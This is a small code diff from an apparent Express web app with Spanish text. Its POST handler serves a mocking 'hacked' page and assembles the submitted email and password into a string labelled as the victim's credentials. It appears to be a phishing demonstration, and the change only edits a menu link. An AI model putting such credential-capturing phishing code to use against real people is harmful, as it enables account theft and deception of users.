@@ -32,7 +32,7 @@ router.post('', (request, response, next) => {
     hacked += '<h2>lol</h2>';
     hacked += '<img src="https://cdn.pixabay.com/photo/2014/04/03/00/39/guy-fawkes-308973_960_720.png">';
     hacked += '<br/>';
-    hacked += '<a href="/phishing">Volver al menú</a>';
+    hacked += '<a href="/">Volver al menú</a>';
     //console.log(request.body.mail);
     //console.log(request.body.psswrd);
     var info_phishing = "Correo de la víctima: "+request.body.mail+" Contraseña: "+request.body.psswrd;
